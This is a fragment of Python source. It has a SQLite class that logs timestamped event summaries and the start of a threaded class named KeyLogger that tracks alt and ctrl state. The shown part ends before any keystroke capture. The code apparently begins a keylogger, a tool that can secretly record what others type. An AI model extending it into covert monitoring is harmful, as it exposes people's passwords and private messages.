import ctypes
import ctypes.util
import threading
import sqlite3
import sys
import time
import datetime
import os
import traceback

class DB(object):
    def __init__(self, db_path):
        self.db_path = db_path
        self.conn = sqlite3.connect(self.db_path)
        self.conn.row_factory = sqlite3.Row
        self.cur = self.conn.cursor()
        self.cur.execute("CREATE TABLE IF NOT EXISTS events "
                         "(timestamp TEXT, "
                         "summary TEXT)")

    def commit(self):
        self.conn.commit()

    def insert(self, timestamp, summary):
        self.cur.execute("INSERT INTO events (timestamp, summary) VALUES "
                         "(?, ?)", (timestamp, summary))
        self.commit()


class KeyLogger(threading.Thread):
    def __init__(self, fname):
        super(KeyLogger, self).__init__()
        self.fname = fname
        self.alt = False
        self.ctrl = False

